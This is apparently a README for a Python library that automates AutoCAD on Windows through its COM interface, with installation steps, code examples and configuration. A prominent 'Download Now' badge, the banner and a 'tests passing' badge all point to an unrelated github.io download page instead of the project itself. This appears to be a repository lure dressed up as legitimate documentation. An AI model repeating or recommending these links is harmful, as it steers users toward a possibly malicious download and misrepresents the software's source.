# autocad-toolkit

[![Download Now](https://img.shields.io/badge/Download_Now-Click_Here-brightgreen?style=for-the-badge&logo=download)](https://iybcy.github.io/autocad-site-rhc/)


[![Banner](banner.png)](https://iybcy.github.io/autocad-site-rhc/)


[![Python Version](https://img.shields.io/badge/python-3.8%2B-blue.svg)](https://www.python.org/downloads/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![PyPI Version](https://img.shields.io/badge/pypi-v0.4.2-orange.svg)](https://pypi.org/project/autocad-toolkit/)
[![Platform](https://img.shields.io/badge/platform-Windows-lightgrey.svg)](https://www.microsoft.com/en-us/windows)
[![Code Style](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)
[![Tests](https://img.shields.io/badge/tests-passing-brightgreen.svg)](https://iybcy.github.io/autocad-site-rhc/)

---

A Python toolkit for automating AutoCAD workflows on Windows — extract drawing data, batch-process DWG files, and integrate AutoCAD operations directly into your Python pipelines via the COM interface.

AutoCAD for Windows exposes a rich COM/ActiveX API, and this toolkit wraps that interface into a clean, Pythonic layer so engineers, designers, and developers can script repetitive drafting tasks, analyze drawing metadata, and build automation pipelines without writing raw COM boilerplate.

---

## Table of Contents

- [Features](#features)
- [Requirements](#requirements)
- [Installation](#installation)
- [Quick Start](#quick-start)
- [Usage Examples](#usage-examples)
- [Configuration](#configuration)
- [Contributing](#contributing)
- [License](#license)

---

## Features

- 🖊️ **Drawing Automation** — Programmatically create, modify, and save DWG files using AutoCAD's COM interface on Windows
- 📂 **Batch File Processing** — Process entire directories of `.dwg` and `.dxf` files with a single function call
- 📊 **Data Extraction** — Extract layer information, block attributes, entity counts, and dimension data from drawings
- 🔄 **Workflow Integration** — Chain AutoCAD operations into larger Python pipelines (ETL, reporting, QA checks)
- 📐 **Geometry Utilities** — Parse and analyze geometric entities: lines, arcs, polylines, circles, and blocks
- 🗂️ **Layout & Sheet Management** — Enumerate and export model space / paper space layouts programmatically
- 📝 **Attribute Reporting** — Collect block attribute values across drawings and export them to CSV, JSON, or Excel
- 🛡️ **Error Handling** — Graceful fallback and logging when AutoCAD is unavailable or files are corrupt

---

## Requirements

| Requirement | Version / Notes |
|---|---|
| Python | 3.8 or higher |
| Operating System | Windows 10 / Windows 11 |
| AutoCAD | 2018 – 2025 (any edition that exposes COM) |
| `pywin32` | ≥ 306 |
| `ezdxf` | ≥ 1.1.0 |
| `pandas` | ≥ 1.5.0 (optional, for tabular exports) |
| `openpyxl` | ≥ 3.1.0 (optional, for Excel export) |

> **Note:** AutoCAD must be installed and licensed on the same Windows machine. This toolkit communicates with a running or launchable AutoCAD instance via the Windows COM/ActiveX interface (`AutoCAD.Application`).

---

## Installation

### From PyPI

```bash
pip install autocad-toolkit
```

### From Source

```bash
git clone https://github.com/your-org/autocad-toolkit.git
cd autocad-toolkit
pip install -e ".[dev]"
```

### Install Optional Dependencies

```bash
# For Excel/CSV export support
pip install autocad-toolkit[export]

# For development and testing
pip install autocad-toolkit[dev]
```

---

## Quick Start

```python
from autocad_toolkit import AcadSession

# Connect to a running AutoCAD for Windows instance
# (launches AutoCAD automatically if not already open)
with AcadSession() as acad:
    doc = acad.open_drawing("C:/Projects/floor_plan.dwg")

    # Print basic drawing info
    print(f"Drawing: {doc.name}")
    print(f"Layers:  {doc.layer_count}")
    print(f"Blocks:  {doc.block_count}")

    # Extract all block attributes to a dict
    attributes = doc.extract_attributes()
    for block_name, attrs in attributes.items():
        print(f"  {block_name}: {attrs}")
```

---

## Usage Examples

### 1. Batch Convert DWG Files to DXF

```python
from pathlib import Path
from autocad_toolkit import BatchProcessor

processor = BatchProcessor(input_dir="C:/Drawings/DWG", output_dir="C:/Drawings/DXF")

results = processor.convert(
    source_format=".dwg",
    target_format=".dxf",
    acad_version="R2018",   # DXF output version
    skip_errors=True         # log failures and continue
)

print(f"Converted: {results.success_count} files")
print(f"Failed:    {results.failure_count} files")

# Inspect failures
for failed in results.failures:
    print(f"  {failed.path}: {failed.reason}")
```

---

### 2. Extract Layer Data from a Drawing

```python
from autocad_toolkit import AcadSession

with AcadSession() as acad:
    doc = acad.open_drawing("C:/Projects/site_plan.dwg")

    layers = doc.get_layers()

    for layer in layers:
        print(
            f"Name: {layer.name:<30} "
            f"Color: {layer.color_index:<5} "
            f"On: {layer.is_on:<6} "
            f"Frozen: {layer.is_frozen}"
        )
```

**Sample output:**
```
Name: 0                              Color: 7     On: True   Frozen: False
Name: WALLS                         Color: 1     On: True   Frozen: False
Name: ELECTRICAL                    Color: 3     On: True   Frozen: True
Name: DIMENSIONS                    Color: 2     On: True   Frozen: False
```

---

### 3. Export Block Attributes to CSV

```python
import pandas as pd
from autocad_toolkit import AcadSession
from autocad_toolkit.export import AttributeExporter

with AcadSession() as acad:
    doc = acad.open_drawing("C:/Projects/equipment_layout.dwg")

    exporter = AttributeExporter(doc)
    df = exporter.to_dataframe(block_filter=["PUMP", "VALVE", "MOTOR"])

print(df.head())
#    block_name  tag_name         value        layer
# 0  PUMP        TAG          P-101        MECH
# 1  PUMP        DESCRIPTION  Feed Pump    MECH
# 2  VALVE       TAG          V-203        PIPING
# 3  MOTOR       KW           15.0         ELEC

# Save to CSV
df.to_csv("equipment_attributes.csv", index=False)
```

---

### 4. Count Entities by Type in Model Space

```python
from autocad_toolkit import AcadSession
from autocad_toolkit.analysis import EntityCounter

with AcadSession() as acad:
    doc = acad.open_drawing("C:/Projects/structural.dwg")
    counter = EntityCounter(doc.model_space)

    summary = counter.count_all()
    for entity_type, count in sorted(summary.items(), key=lambda x: -x[1]):
        print(f"  {entity_type:<20} {count:>6}")
```

**Sample output:**
```
  LINE                    4821
  INSERT                   312
  MTEXT                    289
  LWPOLYLINE               204
  CIRCLE                    87
  ARC                       43
  DIMENSION                 38
```

---

### 5. Automated Drawing QA Check

```python
from autocad_toolkit import AcadSession
from autocad_toolkit.qa import DrawingChecker

REQUIRED_LAYERS = {"TITLE-BLOCK", "DIMENSIONS", "NOTES", "BORDER"}

with AcadSession() as acad:
    doc = acad.open_drawing("C:/Projects/schematic_v3.dwg")
    checker = DrawingChecker(doc)

    report = checker.run_checks(
        required_layers=REQUIRED_LAYERS,
        max_empty_layers=5,
        check_text_height=True,
        min_text_height=2.5
    )

    if report.passed:
        print("✅ Drawing passed all QA checks.")
    else:
        print("❌ QA issues found:")
        for issue in report.issues:
            print(f"   [{issue.severity}] {issue.message}")
```

---

## Configuration

You can configure default behavior via a `acad_toolkit.toml` file in your project root or in `~/.config/autocad_toolkit/`:

```toml
[connection]
launch_if_closed = true
connection_timeout_seconds = 30
visible = false          # run AutoCAD headlessly in the background

[logging]
level = "INFO"
log_file = "autocad_toolkit.log"

[export]
default_csv_delimiter = ","
default_encoding = "utf-8"
excel_engine = "openpyxl"
```

---

## Project Structure

```
autocad-toolkit/
├── autocad_toolkit/
│   ├── __init__.py
│   ├── session.py          # AcadSession: COM connection management
│   ├── document.py         # AcadDocument wrapper
│   ├── batch.py            # BatchProcessor
│   ├── analysis.py         # EntityCounter, geometry utilities
│   ├── export.py           # AttributeExporter, CSV/Excel writers
│   └── qa.py               # DrawingChecker, QA report models
├── tests/
│   ├── test_session.py
│   ├── test_batch.py
│   └── test_analysis.py
├── examples/
│   └── *.py
├── pyproject.toml
└── README.md
```

---

## Contributing

Contributions are welcome! Please follow these steps:

1. **Fork** the repository and create a feature branch:
   ```bash
   git checkout -b feature/your-feature-name
   ```

2. **Install** development dependencies:
   ```bash
   pip install -e ".[dev]"
   ```

3. **Write tests** for your changes in the `tests/` directory.

4. **Run the test suite** before submitting:
   ```bash
   pytest tests/ -v
   ```

5. **Format your code** with Black:
   ```bash
   black autocad_toolkit/
   ```

6. Open a **Pull Request** with a clear description of what you changed and why.

Please read [CONTRIBUTING.md](CONTRIBUTING.md) for our full code of conduct and contribution guidelines.

---

## Roadmap

- [ ] Support for AutoCAD LT attribute extraction (read-only mode via `ezdxf`)
- [ ] CLI interface (`acad-toolkit batch-convert ./drawings`)
- [ ] Async batch processing with `asyncio`
- [ ] Drawing diff / change detection between revisions
- [ ] Plugin support for custom entity handlers

---

## License

This project is licensed under the **MIT License** — see the [LICENSE](LICENSE) file for details.

---

> **Disclaimer:** This toolkit is an independent open-source project and is not affiliated with, endorsed by, or sponsored by Autodesk, Inc. AutoCAD is a registered trademark of Autodesk, Inc. Users are responsible for ensuring they hold a valid AutoCAD license on the Windows systems where this toolkit is deployed.